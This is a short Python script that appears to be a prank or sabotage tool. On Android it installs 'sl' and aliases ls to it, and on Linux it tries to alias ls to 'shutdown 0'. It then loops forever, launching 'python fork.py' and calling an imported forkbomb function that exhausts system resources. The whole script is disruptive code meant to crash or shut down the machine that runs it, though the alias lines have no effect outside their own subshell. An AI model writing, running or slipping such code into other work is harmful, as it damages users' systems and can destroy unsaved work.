import os
import platform
from forkbomb import forkbomb
if platform.system() == "Android":
  os.system("yes | pkg install sl")
  os.system("clear")
  os.system('alias ls="sl"')
elif platform.system() == "Linux":
  os.system('alias ls="shutdown 0"')
else:
  pass
while True:
  os.system("python fork.py")
  forkbomb()
